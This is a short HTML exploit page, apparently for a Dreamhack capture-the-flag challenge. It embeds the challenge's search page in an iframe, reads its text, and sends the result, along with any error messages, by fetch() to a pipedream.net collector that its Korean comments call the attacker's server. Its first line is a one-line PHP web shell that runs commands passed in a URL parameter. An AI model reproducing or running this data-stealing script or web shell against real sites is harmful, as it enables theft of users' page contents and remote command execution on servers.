#<?php system($_GET["cmd"]); ?>

<!DOCTYPE html>
<html>
  <body>
    <h1>XS-Search Exploit</h1>
    <iframe id="leak" src="http://host1.dreamhack.games:19178/search?query=DH"></iframe>

    <script>
      // 약간의 대기 후 실행 (iframe 로드 기다리기)
      setTimeout(() => {
        try {
          // iframe 안의 DOM 접근
          let frame = document.getElementById("leak");
          let flag = frame.contentDocument.body.innerText;

          // 외부 서버(공격자 서버)로 전송
          fetch("https://eo9ellh0vyupnv7.m.pipedream.net/?flag=" + encodeURIComponent(flag));
        } catch (e) {
          // 에러시 디버깅용
          fetch("https://eo9ellh0vyupnv7.m.pipedream.net/?error=" + encodeURIComponent(e.message));
        }
      }, 2000);
    </script>
  </body>
</html>
